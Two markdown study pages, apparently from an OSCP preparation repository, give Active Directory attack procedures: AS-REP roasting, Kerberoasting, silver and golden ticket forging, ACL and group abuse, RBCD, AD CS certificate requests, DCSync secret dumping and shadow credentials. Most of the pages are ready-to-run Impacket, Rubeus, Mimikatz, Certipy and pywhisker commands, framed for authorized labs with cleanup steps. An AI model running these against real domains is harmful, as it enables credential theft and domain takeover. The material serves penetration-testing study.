pages.markdown:
# Kerberos and Identity Transitions [← Stage index](README.md) | [Domain mapping](01-domain-mapping.md) | [Credential access](02-credential-access.md) | [Credential handling](../04-shells-transfers-credentials/03-credential-use-and-cracking.md) | [AD cheatsheet](../../cheatsheets/active-directory.md) | [Strategy map](../../notes/Attack_Strategy_Map.md) | Study methods: [Recover and use authentication material](../../notes/methods/credentials.md); [Map Active Directory attack paths](../../notes/methods/ad-mapping.md); [Gain a more useful domain identity](../../notes/methods/ad-identities.md) > **Purpose:** convert a validated Block 10 identity/account/SPN/ticket candidate into typed offline material or a new authenticated identity, then return to mapping. > > **Boundary:** ticket requests and local ticket handling are covered here. Matching the resulting password/hash/ticket to remote execution is [Block 12 lateral movement](05-lateral-movement.md). ## 1. Kerberos model and prerequisites ```text AS-REQ/AS-REP: user proves knowledge of long-term key -> receives TGT TGS-REQ/TGS-REP: TGT requests SERVICE/HOST -> receives service ticket AP-REQ: client presents service ticket -> service authenticates client AUTHORIZATION: target service still evaluates the represented identity/claims ``` Before changing credentials or tools: ```bash getent hosts DC_HOST nc -nvz DC_IP 88 date -u ``` ```cmd w32tm /query /status klist ``` Record domain FQDN/realm, DC FQDN/IP, source DNS, current time, KDC route and exact target SPN. IP connectivity does not replace hostname/SPN correctness. ## 2. Password policy and bounded validation ```cmd net accounts /domain ``` ```powershell Get-DomainPolicyData | Select-Object -ExpandProperty SystemAccess ``` Password validation belongs to the existing [credential procedure](../04-shells-transfers-credentials/03-credential-use-and-cracking.md). Do not spray by default. If explicitly required, account for lockout threshold, duration, observation window and prior failures; use one justified candidate, stop on lockout/rate-limit evidence and preserve successful identities separately. ## 3. AS-REP roasting ### Why AS-REP roasting works Ordinary Kerberos preauthentication makes the user prove knowledge of the long-term key before the KDC returns AS-REP material. If the account has `DONT_REQUIRE_PREAUTH`, an unauthenticated requester can ask for an AS-REP whose encrypted component can be tested offline against password candidates. ```text KNOWN USERNAME + PREAUTH DISABLED + KDC REACHABLE -> AS-REP CIPHER -> OFFLINE GUESSING -> PASSWORD ONLY IF A CANDIDATE VERIFIES ``` ### One known user, no password ```bash impacket-GetNPUsers 'DOMAIN/TARGET_USER' -no-pass -request \ -dc-ip DC_IP -outputfile asrep-TARGET_USER.hashes ``` ### Supplied user list, no password ```bash impacket-GetNPUsers 'DOMAIN/' -no-pass -request -usersfile users.txt \ -dc-ip DC_IP -outputfile asrep.hashes ``` ### Authenticated directory-backed discovery ```bash impacket-GetNPUsers 'DOMAIN/USER' -request \ -dc-ip DC_IP -outputfile asrep.hashes ``` Omitting the password from the target lets the tool prompt rather than storing it in shell history. ### Windows/Rubeus alternative ```cmd Rubeus.exe asreproast /user:TARGET_USER /domain:DOMAIN /dc:DC_HOST /outfile:asrep.hashes /format:hashcat ``` ### Interpret before cracking | Output | Meaning | Next action | | --- | --- | --- | | `$krb5asrep$23$` | RC4 AS-REP offline verifier | Hashcat mode 18200 | | AS-REP with another etype | Different cipher/format | Match the exact prefix to installed Hashcat/John support | | `KDC_ERR_C_PRINCIPAL_UNKNOWN` | User/realm not found | Recheck spelling, realm and DC | | Preauthentication required / no `UF_DONT_REQUIRE_PREAUTH` | Account is not roastable through this method | Disprove this path for that account | | Timeout/name error | KDC route/DNS problem | Fix route/FQDN/time before account conclusions | ```bash hashcat -m 18200 asrep.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule hashcat -m 18200 asrep.hashes --show ``` Do not call the account compromised because a hash was captured. Only a verified offline candidate produces a password, and that password still needs identity/access mapping. ## 4. Kerberoasting ### Why Kerberoasting works Any valid domain identity can normally request a service ticket for an SPN. The ticket is encrypted with key material belonging to the SPN account, allowing offline password guessing. ```text VALID DOMAIN IDENTITY + SPN ACCOUNT + KDC ROUTE -> TGS-REP CIPHER -> OFFLINE GUESSING -> SERVICE-ACCOUNT PASSWORD IF A CANDIDATE VERIFIES ``` Rank SPN accounts before requesting tickets: group/ACL value, service/host, account type, password age, enabled state and resulting access matter more than collecting every ticket. ### Enumerate without requesting tickets ```bash impacket-GetUserSPNs -dc-ip DC_IP 'DOMAIN/USER' ``` ```cmd Rubeus.exe kerberoast /stats /domain:DOMAIN /dc:DC_HOST ``` ### Request one selected user ```bash impacket-GetUserSPNs -request-user TARGET_USER -dc-ip DC_IP \ -outputfile kerberoast-TARGET_USER.hashes 'DOMAIN/USER' ``` ```cmd Rubeus.exe kerberoast /user:TARGET_USER /domain:DOMAIN /dc:DC_HOST /outfile:kerberoast.hashes ```
Request all mapped candidates ```bash impacket-GetUserSPNs -request -dc-ip DC_IP \ -outputfile kerberoast.hashes 'DOMAIN/USER' ``` ```cmd Rubeus.exe kerberoast /domain:DOMAIN /dc:DC_HOST /outfile:kerberoast.hashes ``` Use broad requests only when scope and the candidate inventory justify them. Prefer one ranked account during verification.
### Hash type and cracking | Prefix | Kerberos etype | Hashcat mode | | --- | ---: | ---: | | `$krb5tgs$23$` | RC4-HMAC | 13100 | | `$krb5tgs$17$` | AES128 | 19600 | | `$krb5tgs$18$` | AES256 | 19700 | ```bash hashcat -m 13100 kerberoast.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule hashcat -m 19600 kerberoast-aes128.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule hashcat -m 19700 kerberoast-aes256.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule hashcat -m MODE HASH_FILE --show ``` Select the mode from the actual prefix and current `hashcat --example-hashes`; do not assume every TGS is RC4. AES material is still an offline verifier but generally costs more per guess. Cracking feasibility is governed mainly by password strength and candidates, not merely ticket acquisition. ### Common failures - no SPNs returned: wrong domain/base/authentication context, filtering or no user SPNs; - `KDC_ERR_S_PRINCIPAL_UNKNOWN`: SPN is absent/malformed or queried in the wrong realm; - `KDC_ERR_ETYPE_NOSUPP`: requested cipher conflicts with account/domain policy; - output wraps or fails to load: save directly to an output file and verify prefix/line integrity; - crack exhausts candidates: password not represented by the tested model; the account is not therefore “secure.” ## 5. Targeted Kerberoasting from object control If Block 10 proved effective write access to a user object's `servicePrincipalName`, an SPN can be temporarily added, requested and removed. This is a state-changing directory attack and must preserve original state. Built-in SPN operations: ```cmd setspn -L TARGET_USER setspn -S temporary/TARGET_USER TARGET_USER ``` Request only that account: ```bash impacket-GetUserSPNs -request-user TARGET_USER -dc-ip DC_IP \ -outputfile targeted-TARGET_USER.hashes 'DOMAIN/USER' ``` Cleanup: ```cmd setspn -D temporary/TARGET_USER TARGET_USER setspn -L TARGET_USER ``` The controlled right must apply to the SPN attribute, `-S` must not collide with an existing SPN, and cleanup is part of the procedure. A recovered password is still validated and mapped as a new identity. ## 6. Ticket inventory, classification and conversion ```cmd klist klist tgt klist sessions klist -li 0xLUID tickets klist -li 0xLUID tgt Rubeus.exe triage Rubeus.exe dump /luid:0xLUID /nowrap ``` > Do not run `klist purge` during triage. | Field/pattern | Interpretation | Decision | | --- | --- | --- | | `Client: USER @ REALM` | Identity represented | Map that exact user/computer and realm | | Client ending in `$` | Computer identity | Establish machine-account rights; do not treat as a human user | | `Server: krbtgt/REALM` | TGT | Can request service tickets while valid, within that client's authorization | | `Server: cifs/HOST` | CIFS service ticket | Only SMB/CIFS on the named host; authorization still applies | | `Server: ldap/DC_HOST` | LDAP service ticket | LDAP authentication, not replication rights | | Other `SERVICE/HOST` | Ticket for that SPN | Use matching hostname/service/client | | `Start/End/Renew Time` | Validity windows | Import cannot revive an expired/not-yet-valid ticket | | Ticket flags | Kerberos behavior/history | Not evidence of privilege | | `Kdc Called` | Issuing KDC | Not evidence of access to that DC | | Encryption/session key | Compatibility/policy clue | Not privilege or password strength | Linux cache: ```bash klist -c ticket.ccache export KRB5CCNAME="$PWD/ticket.ccache" ``` Convert only when a client expects the other container: ```bash impacket-ticketConverter ticket.kirbi ticket.ccache impacket-ticketConverter ticket.ccache ticket.kirbi ``` ## 7. Pass-the-Ticket and key-to-ticket transitions These commands establish a local ticket context. Block 12 selects and validates the remote service. Windows/Rubeus: ```cmd Rubeus.exe ptt /ticket:ticket.kirbi klist ``` Windows/Mimikatz: ```text kerberos::ptt ticket.kirbi kerberos::list ``` Linux: ```bash export KRB5CCNAME="$PWD/ticket.ccache" klist ``` NT hash or AES key to a TGT: ```cmd Rubeus.exe asktgt /user:USER /domain:DOMAIN /rc4:NT_HASH /dc:DC_HOST /ptt klist ``` Use `/aes128:` or `/aes256:` when that is the actual key type and tool version supports it. RC4-based requests can fail where RC4 is disabled even though the NT hash is correct. Mimikatz creates a new process using supplied key material: ```text sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NT_HASH /run:cmd.exe ``` This is a credential/ticket-context transition, not proof that a destination accepts the identity. ## 8. Silver tickets: forge one service ticket > **Prerequisite:** key/hash of the account encrypting the target SPN's tickets, domain SID, exact SPN/service/host, a plausible existing domain identity and compatible target-service validation behavior. Linux/Impacket: ```bash impacket-ticketer -nthash SERVICE_NT_HASH -domain-sid DOMAIN_SID \ -domain DOMAIN -spn cifs/TARGET_HOST AUTHORIZED_TEST_USER export KRB5CCNAME="$PWD/AUTHORIZED_TEST_USER.ccache" klist ``` Windows/Mimikatz: ```text kerberos::golden /sid:DOMAIN_SID /domain:DOMAIN /target:TARGET_HOST /service:cifs /rc4:SERVICE_NT_HASH /user:AUTHORIZED_TEST_USER /ptt ``` Despite the Mimikatz module name, supplying a service/target key produces a silver/service ticket, not a krbtgt-signed TGT. Important boundaries: - the key must belong to the account that owns the SPN; machine-account keys commonly protect host services; - the ticket is limited to the named service/host and whichever services share the same account key; - current PAC enforcement means using a nonexistent identity can fail; use a real authorized test identity and validate behavior; - a service may perform KDC/PAC validation or additional authorization; - a successfully imported ticket is not successful service access. Golden tickets require the KRBTGT key and domain SID and create a forged TGT. They are a high-impact persistence concept covered in the [conditional domain-compromise section](04-object-control-adcs-and-domain-compromise.md#conditional-high-impact-ticket-forging-concepts), not a default Block 11 action. ## 9. Re-enumerate every new identity ```text NEW PASSWORD/HASH/KEY/TICKET -> VERIFY TYPE, CLIENT, REALM, VALIDITY -> AUTHENTICATE THROUGH ONE COMPATIBLE SERVICE -> CONFIRM IDENTITY -> REPEAT GROUP/ACL/SHARE/HOST/SESSION/ROUTE MAPPING ``` Do not overwrite the old state. Record which source produced the material and which protocol accepted it. ## 10. Failure router | Symptom | Layer | Next test | | --- | --- | --- | | KDC unreachable | Route/service | DNS/FQDN, TCP/UDP 88, pivot path | | Clock-skew error | Time | Synchronize source to authorized domain time | | Principal unknown | Identity/realm | Exact username, realm and DC | | Preauth required | AS-REP prerequisite absent | Disprove AS-REP roast for that account | | No SPNs | Enumeration/context | Correct domain, bind identity, filter and account type | | Etype unsupported | Cipher policy | Use supported account/domain/tool path; do not blame password | | Hashcat loads zero hashes | Format/mode/file integrity | Inspect prefix, wrapping and mode examples | | Exhausted wordlist | Candidate model failed | Improve candidates or deprioritize; no credential was recovered | | Ticket import succeeds, access fails | SPN/service/authorization/route | Client, validity, hostname, service class and target rights | | Silver ticket rejected | Wrong key/SPN/domain SID/PAC behavior | Revalidate every prerequisite; use a real authorized identity | | NT hash to TGT fails | RC4 disabled or identity/key mismatch | Exact key type, realm, user and KDC policy | ## Tooling for this section | Tool | Choose it when | Requirements | Baseline | Decisive output | Failure cue | | --- | --- | --- | --- | --- | --- | | Impacket GetNPUsers | AS-REP candidate from Kali | Username/list, KDC route; no password for direct candidate test | Section 3 | `$krb5asrep$` line | Preauth required/principal unknown | | Impacket GetUserSPNs | Enumerate/request selected SPN account | Valid domain identity, LDAP/KDC route | `-request-user TARGET_USER` | `$krb5tgs$` line | No SPN/etype/KDC error | | Rubeus | Windows roasting and ticket lifecycle | Domain Windows context or alternate credential; compatible build | `kerberoast /stats`, selected roast, `triage` | Account/hash/ticket metadata | LDAP/KDC/privilege/version failure | | Hashcat/John | Offline verifier testing | Exact format/mode and candidates | Modes 18200/13100/19600/19700 as applicable | Verified recovered candidate | Zero hashes loaded/exhausted candidates | | `klist` | Native ticket metadata | Windows or Kerberos client | `klist` / `klist -c` | Client, server, validity, etype | Wrong cache/LUID or expired ticket | | Impacket ticketConverter | Tool requires ccache vs kirbi | Valid ticket file and compatible release | `ticketConverter INPUT OUTPUT` | Parsed output container | Invalid/truncated ticket | | Impacket ticketer/Mimikatz | Validated silver-ticket prerequisite | Service/machine key, SID, SPN and isolated authorization | Section 8 | Ticket with expected client/server fields | Wrong key/SPN/PAC/authorization | ## Timeroast — offline recovery of weak computer-account passwords via MS-SNTP Use when the DC exposes UDP/123 and Windows authenticated NTP responses are available for computer/trust-account RIDs. This is separate from Kerberos roasting and does not require a domain password. Prefer a known computer RID; the example range is bounded discovery, not a completeness guarantee. ```bash python3 timeroast.py DC_IP --rids 1000-1100 --rate 10 --timeout 5 -o timeroast.txt hashcat -m 31300 --username timeroast.txt WORDLIST hashcat -m 31300 --username timeroast.txt --show ``` Read: output resembles `RID:$sntp-ms$...` and is a response-derived offline verifier, not a reusable NT hash. Map any recovered RID to the exact computer/trust identity before testing its password on one relevant service. Normally rotated random machine passwords are not practical dictionary candidates. No reply can mean filtering, unsupported behavior, nonexistent RIDs or packet loss. Do not infer no AD accounts or switch blindly to an unbounded RID sweep. The source's NetExec module is an alternative wrapper; inspect its installed options because its default RID sweep is very broad. Sources: [upstream 1](https://github.com/SecuraBV/Timeroast) · [upstream 2](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/timeroast.py). ## Sources - Supplied PEN-200, Chapter 23, pp758–785, and Chapter 24 ticket handling where referenced. - [OffSec OSCP+ Body of Knowledge](https://help.offsec.com/hc/en-us/articles/38543335188756-OSCP-Body-of-knowledge) - [OffSec OSCP+ Exam FAQ](https://help.offsec.com/hc/en-us/articles/4412170923924-OSCP-Exam-FAQ) - [Impacket GetNPUsers](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py), [GetUserSPNs](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py), [ticketConverter](https://github.com/fortra/impacket/blob/master/examples/ticketConverter.py) and [ticketer](https://github.com/fortra/impacket/blob/master/examples/ticketer.py) - [Rubeus](https://github.com/GhostPack/Rubeus) - [Microsoft `klist`](https://learn.microsoft.com/windows-server/administration/windows-commands/klist) - [Hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) - [getSH Active Directory route](https://lizajose.github.io/getSH/ad), source snapshot [`e1f62dd`](https://github.com/lizajose/getSH/commit/e1f62dd351bd061b59e2573beea741f6c5bb4f98) - [Hexdump consolidated cheatsheet](https://github.com/LeonardoE95/OSCP/blob/main/cheatsheet.org). Its AS-REP/Kerberoast seeds were checked against current Impacket, Rubeus and Hashcat sources; the live Hexdump AD module itself was still a TODO.

pages.title: Object Control, AD CS and Domain Compromise
pages.markdown:
# Object Control, AD CS and Domain Compromise

[← Stage index](README.md) | [Domain mapping](01-domain-mapping.md) | [AD cheatsheet](../../cheatsheets/active-directory.md) | [Strategy map](../../notes/Attack_Strategy_Map.md) | Study methods: [Map Active Directory attack paths](../../notes/methods/ad-mapping.md); [Gain a more useful domain identity](../../notes/methods/ad-identities.md)

> **Active Block 11 core:** user, group, SPN and DACL-backed identity transitions, plus the rights required for DCSync.
>
> **Conditional supplements:** GPO abuse, delegation/RBCD and AD CS remain evidence-led branches rather than core Block 11 study.

## Directory-object control

> **Model:** controlled principal → effective ACE → target object/type → permitted modification → authentication/authorization effect → cleanup.

Enumerate a target's ACL with resolved GUIDs:

```powershell
Import-Module .\PowerView.ps1
Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs |
  Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|ExtendedRight' }
```

Resolve trustees:

```powershell
ConvertFrom-SID 'S-1-5-21-...'
Get-DomainObject -Identity 'S-1-5-21-...' | Select-Object samaccountname,objectclass
```

Common effects require different rights:

| Right/object | Possible controlled effect | Validation needed |
| --- | --- | --- |
| `GenericAll`/password-reset extended right on user | Reset the user's password | Effective trustee, account state, protected-object behavior |
| `GenericAll` or effective member-attribute write on group | Add a controlled principal to the group | Target group, nesting and a refreshed logon token |
| `GenericWrite`/SPN-property write on user | Add a temporary SPN, request a TGS and remove it | Exact property right, duplicate-SPN checks and cleanup |
| `WriteDacl` | Grant a narrower right | Ability to write DACL and restore original ACL |
| `WriteOwner` | Change owner, then possibly DACL | Owner semantics and cleanup |
| Computer-object write | RBCD-related attribute change | Machine account/control, SPN/Kerberos and target service |

### Password reset

A password-reset right creates a new password credential; it does not reveal the old one. This is disruptive because an unknown original password cannot be restored.

```powershell
$Secure = ConvertTo-SecureString 'TEMP_PASSWORD' -AsPlainText -Force
Set-DomainUserPassword -Identity TARGET_USER -AccountPassword $Secure -Verbose
net user TARGET_USER TEMP_PASSWORD /domain
```

Validate the account state and authenticate only to an approved service as the target identity. Prefer a reversible route when one exists.

### Group membership

```powershell
Add-DomainGroupMember -Identity TARGET_GROUP -Members CONTROLLED_USER -Verbose
Get-DomainGroupMember -Identity TARGET_GROUP |
  Where-Object { $_.MemberName -eq 'CONTROLLED_USER' }

# Built-in alternative
net group TARGET_GROUP CONTROLLED_USER /add /domain
```

A current session may not receive the new group SID until a fresh logon. Validate with a new session/token, then remove the membership after the authorized objective:

```powershell
Remove-DomainGroupMember -Identity TARGET_GROUP -Members CONTROLLED_USER -Verbose -Confirm:$false
net group TARGET_GROUP CONTROLLED_USER /delete /domain
```

### Targeted Kerberoast through SPN write

If the effective right permits writing `servicePrincipalName` on a user, add a unique temporary SPN, request that account's ticket and remove the SPN immediately. The cracking workflow is in [Kerberos and identity transitions](03-kerberos-and-identity-transitions.md).

```powershell
setspn -S TEMP/TARGET_USER TARGET_USER
setspn -Q TEMP/TARGET_USER
Rubeus.exe kerberoast /user:TARGET_USER /outfile:TARGET_USER.tgs /format:hashcat
setspn -D TEMP/TARGET_USER TARGET_USER
```

### Owner and DACL transitions

`WriteOwner` can make the controlled identity the owner; ownership may then permit a DACL change. `WriteDacl` can grant only the narrower right needed for the intended transition.

```powershell
Set-DomainObjectOwner -Identity TARGET_OBJECT -OwnerIdentity CONTROLLED_USER -Verbose
Add-DomainObjectAcl -TargetIdentity TARGET_OBJECT -PrincipalIdentity CONTROLLED_USER -Rights ResetPassword -Verbose

# Group-membership variant
Add-DomainObjectAcl -TargetIdentity TARGET_GROUP -PrincipalIdentity CONTROLLED_USER -Rights WriteMembers -Verbose

# Remove the ACE after the authorized objective
Remove-DomainObjectAcl -TargetIdentity TARGET_OBJECT -PrincipalIdentity CONTROLLED_USER -Rights ResetPassword -Verbose
```

Export the original owner/security descriptor before changing it and restore exactly that state. Password resets, membership changes, SPN writes, ownership changes and ACE grants are state changes; do not execute merely because a graph shows an edge.

## Conditional: GPO control

Identify GPOs and links:

```powershell
Get-DomainGPO
Get-DomainOU | Select-Object name,distinguishedname,gplink
Get-DomainObjectAcl -SearchBase 'CN=Policies,CN=System,DC=DOMAIN,DC=TLD' -ResolveGUIDs |
  Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteProperty' }
```

For a candidate, prove:

1. the controlled principal can edit both the directory object and relevant SYSVOL policy files;
2. the GPO is linked to the OU containing the intended test host/user;
3. security filtering and WMI filters include that subject;
4. the configured preference/task/script runs in the expected context; and
5. policy refresh or another predictable trigger will occur.

SharpGPOAbuse supports immediate-task/local-group techniques, but syntax is version-sensitive and the action changes domain policy. Inspect the installed build before a controlled lab action:

```cmd
SharpGPOAbuse.exe --help
gpresult /r
gpupdate /force
```

Back up the GPO, restrict the target/scope, document the exact change and restore it after validation.

## Conditional: delegation paths

Enumerate before attempting any ticket operation:

```powershell
Get-DomainComputer -Unconstrained | Select-Object dnshostname
Get-DomainUser -TrustedToAuth | Select-Object samaccountname
Get-DomainComputer -TrustedToAuth | Select-Object dnshostname
Get-DomainObject -LDAPFilter '(msDS-AllowedToDelegateTo=*)' -Properties samaccountname,msds-allowedtodelegateto
```

```bash
impacket-findDelegation 'DOMAIN/USER:PASSWORD' -dc-ip DC_IP
```

Constrained delegation/S4U requires control of the delegated account/key and an allowed SPN:

```bash
impacket-getST -spn ALLOWED_SPN -impersonate AUTHORIZED_TEST_USER \
  -dc-ip DC_IP 'DOMAIN/DELEGATED_USER:PASSWORD'
export KRB5CCNAME="$PWD/AUTHORIZED_TEST_USER.ccache"
```

Use the ticket only for the approved service/host. Unconstrained delegation can expose forwarded/cached tickets, but coercing authentication changes another host's behavior and is not a baseline. Validate only in a disposable authorized lab and protect ticket material.

### Resource-based constrained delegation

> **Prerequisite:** effective write control over the target computer's `msDS-AllowedToActOnBehalfOfOtherIdentity` plus control of a principal with an SPN (often a lab computer account).

```bash
impacket-addcomputer 'DOMAIN/USER:PASSWORD' -computer-name 'LABCOMPUTER$' \
  -computer-pass 'LAB_MACHINE_PASSWORD' -dc-host DC_HOST -dc-ip DC_IP

impacket-rbcd -delegate-from 'LABCOMPUTER$' -delegate-to 'TARGETCOMPUTER$' \
  -action write -dc-ip DC_IP 'DOMAIN/USER:PASSWORD'

impacket-getST -spn cifs/TARGET_HOST -impersonate AUTHORIZED_TEST_USER \
  -dc-ip DC_IP 'DOMAIN/LABCOMPUTER$:LAB_MACHINE_PASSWORD'
```

Cleanup after the lab objective:

```bash
impacket-rbcd -delegate-from 'LABCOMPUTER$' -delegate-to 'TARGETCOMPUTER$' \
  -action remove -dc-ip DC_IP 'DOMAIN/USER:PASSWORD'
impacket-addcomputer 'DOMAIN/USER:PASSWORD' -computer-name 'LABCOMPUTER$' \
  -delete -dc-ip DC_IP
```

Machine-account quota, computer-object rights, DNS/SPN naming and target service authorization are separate prerequisites.

## Conditional: AD CS enumeration

> **Prerequisite:** reachable CA/DC and a valid domain identity. **Decisive output:** a CA/template whose enabled state, enrollment rights and configuration satisfy a specific ESC path.

Package names vary:

```bash
command -v certipy-ad || command -v certipy
certipy-ad find -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP \
  -enabled -vulnerable -stdout
```

Review:

- CA name and host;
- template name and whether it is enabled/published;
- who can enroll;
- client-authentication EKUs/purpose;
- subject/SAN supply controls;
- manager approval/signature requirements;
- template owner and modification rights;
- web enrollment/relay-related configuration where relevant.

An `ESC` label is a candidate classification. Manually validate the properties and the controlled identity's effective rights.

## Conditional: certificate request and authentication

Generic request after validating a specific template:

```bash
certipy-ad req -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP \
  -target DC_HOST -ca CA_NAME -template TEMPLATE
```

An alternate UPN/SID request is appropriate only when the validated template permits it and the lab explicitly authorizes impersonation testing:

```bash
certipy-ad req -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP \
  -target DC_HOST -ca CA_NAME -template TEMPLATE \
  -upn 'TEST_USER@DOMAIN' -sid 'TEST_USER_SID'
```

```bash
certipy-ad auth -pfx CERTIFICATE.pfx -dc-ip DC_IP
```

Treat PFX files, tickets and returned hashes as credentials. Verify certificate subject/SID, validity and intended identity. A successful issuance is not the same as successful PKINIT authentication.

## Conditional: ESC4/template-write boundary

Before any authorized template change, save configuration:

```bash
certipy-ad template -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP \
  -template TEMPLATE -save-configuration template-backup.json
```

Template writes alter Active Directory configuration and may affect many principals. Use only an explicitly authorized disposable lab path, inspect `certipy-ad template -h` for the installed version, and restore the saved configuration after the demonstration.

## DCSync replication rights

> **Prerequisite:** effective domain-root rights equivalent to `Replicating Directory Changes` plus `Replicating Directory Changes All` (and filtered-set rights where applicable). Domain membership or local admin on an ordinary host is insufficient.

Validate ACLs at the domain root:

```powershell
Get-DomainObjectAcl -Identity 'DC=DOMAIN,DC=TLD' -ResolveGUIDs |
  Where-Object { $_.ObjectAceType -match 'Replication-Get-Changes' }
```

A controlled DACL transition can grant these rights, but doing so changes the domain security descriptor and creates a domain-compromise path:

```powershell
Add-DomainObjectAcl -TargetIdentity 'DC=DOMAIN,DC=TLD' -PrincipalIdentity CONTROLLED_USER -Rights DCSync -Verbose

# Remove the delegated replication ACE after the authorized objective
Remove-DomainObjectAcl -TargetIdentity 'DC=DOMAIN,DC=TLD' -PrincipalIdentity CONTROLLED_USER -Rights DCSync -Verbose
```

Local administrator rights on a member host, an LDAP bind or a valid Kerberos ticket do not supply replication rights. Re-read the effective domain-root ACL before and after a change.

Request one approved test account rather than dumping the directory:

```bash
impacket-secretsdump -just-dc-user TARGET_USER -dc-ip DC_IP \
  'DOMAIN/USER:PASSWORD@DC_HOST'
```

Mimikatz equivalent from an authorized Windows context:

```text
lsadump::dcsync /domain:DOMAIN /user:TARGET_USER
```

> **Decisive output:** selected directory secret material returned through replication. Treat it as domain compromise evidence. Stop, protect evidence, document the delegated right and move to remediation reasoning rather than broad collection.

## Conditional: high-impact ticket-forging concepts

Golden tickets require the domain SID and KRBTGT key. They are persistence/impact concepts, not a default Block 11 action. A forged ticket still depends on correct cryptographic material, realm, time and authorization. For the active service-scoped case, use [Silver tickets](03-kerberos-and-identity-transitions.md#8-silver-tickets-forge-one-service-ticket).

Authorized isolated-lab examples:

```bash
# Golden: realm-wide TGT material
impacket-ticketer -nthash KRBTGT_NT_HASH -domain-sid DOMAIN_SID \
  -domain DOMAIN AUTHORIZED_TEST_USER

export KRB5CCNAME="$PWD/AUTHORIZED_TEST_USER.ccache"
klist
```

Use only against the approved service/host, record ticket metadata and remove generated credentials afterward. Domain recovery after KRBTGT exposure generally requires coordinated credential rotation and replication convergence; service-ticket exposure requires rotating the affected service/machine secret and reviewing access.

## bloodyAD — Linux-side LDAP reads and permission-backed writes

Use an authenticated LDAP context and the exact right on the target object. Start with a read. These writes are distinct alternatives selected by the observed ACL:

```bash
# Inspect the target/group instead of assuming the relationship
bloodyAD --host DC_HOST -d DOMAIN -u USER -p 'PASSWORD' \
  get object TARGET_OBJECT --attr distinguishedName,member,memberOf

# Force-change-password right on this specific account
bloodyAD --host DC_HOST -d DOMAIN -u USER -p 'PASSWORD' \
  set password TARGET_USER 'NEW_PASSWORD'

# Write-members right on this specific group
bloodyAD --host DC_HOST -d DOMAIN -u USER -p 'PASSWORD' \
  add groupMember TARGET_GROUP USER
```

Read: verify the actual attribute change and test the resulting identity/capability through a compatible service. Group changes do not automatically refresh an existing process token/ticket. Access denied → inspect the object DACL and protected-account context; authentication alone is insufficient. Account Operators membership does not imply control over protected administrator accounts/groups.

Sources: [upstream 1](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide).


## Delegated reads — LAPS and gMSA material

Use when directory permissions grant access to the secret-bearing attribute. Being able to enumerate the computer or service account does not grant that read.

```bash
# Classic LAPS: password for the relevant computer's local administrator
bloodyAD --host DC_HOST -d DOMAIN -u USER -p 'PASSWORD' \
  get object 'COMPUTER$' --attr ms-Mcs-AdmPwd

# Windows LAPS: returned content/format depends on schema and protection
bloodyAD --host DC_HOST -d DOMAIN -u USER -p 'PASSWORD' \
  get object 'COMPUTER$' --attr msLAPS-Password

# gMSA: inspect the allowed managed-password attribute
bloodyAD --host DC_HOST -d DOMAIN -u USER -p 'PASSWORD' \
  get object 'GMSA$' --attr msDS-ManagedPassword
```

Read: a LAPS value is scoped to the named host's local account. An encrypted Windows-LAPS value still needs the permitted decryption context. A gMSA blob/base64 string is not automatically a directly reusable NT hash: parse/decode it with a compatible gMSA tool before choosing authentication. Missing/denied attributes → distinguish schema, permissions and an empty value.

Sources: [upstream 1](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide) · [upstream 2](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview).


## Shadow credentials — object-key write, PKINIT, then cleanup

Use only with effective write access to the target's `msDS-KeyCredentialLink`, a DC supporting the required key-trust/PKINIT behavior, correct time/DNS and compatible certificates. Inspect existing values first.

```bash
python3 pywhisker.py -d DOMAIN -u USER -p 'PASSWORD' --dc-ip DC_IP \
  --target TARGET_USER --action list

# Adds a new key credential and generates certificate material; record its DeviceID
python3 pywhisker.py -d DOMAIN -u USER -p 'PASSWORD' --dc-ip DC_IP \
  --target TARGET_USER --action add --filename target-key

# Use the generated PFX password; request the target principal's TGT
python3 gettgtpkinit.py -cert-pfx target-key.pfx -pfx-pass 'PFX_PASSWORD' \
  -dc-ip DC_IP DOMAIN/TARGET_USER target.ccache
export KRB5CCNAME="$PWD/target.ccache"
klist

# Optional NT-hash recovery from this PKINIT TGT; key is the printed AS-REP key
python3 getnthash.py -key AS_REP_KEY -dc-ip DC_IP DOMAIN/TARGET_USER

# Remove only the key credential you added; never clear unrelated original values
python3 pywhisker.py -d DOMAIN -u USER -p 'PASSWORD' --dc-ip DC_IP \
  --target TARGET_USER --action remove --device-id DEVICE_ID
```

Read: a successful attribute write does not yet establish a TGT or service authorization. Verify the cached principal and the intended service. PKINIT/certificate failure → inspect KDC support, mapping and trust; do not keep overwriting keys. Preserve the original state and remove only your added DeviceID after the test.

Sources: [upstream 1](https://github.com/ShutdownRepo/pywhisker) · [upstream 2](https://github.com/dirkjanm/PKINITtools).


## PassTheCert — Schannel/LDAP when the certificate is usable there

Use a certificate/private key mapped to an accepted AD identity with the necessary trust/EKU and a working LDAP TLS path. PKINIT and Schannel are different authentication paths: failure of one does not prove the other works or fails.

```bash
# Extract PEM material from the relevant PFX; respond to password prompts
openssl pkcs12 -in USER.pfx -clcerts -nokeys -out USER.crt
openssl pkcs12 -in USER.pfx -nocerts -nodes -out USER.key

# First identify the principal accepted through the certificate
python3 passthecert.py -action whoami -crt USER.crt -key USER.key \
  -domain DOMAIN -dc-host DC_HOST -dc-ip DC_IP

# Inspect operations in the LDAP shell before choosing an authorized write
python3 passthecert.py -action ldap-shell -crt USER.crt -key USER.key \
  -domain DOMAIN -dc-host DC_HOST -dc-ip DC_IP
```

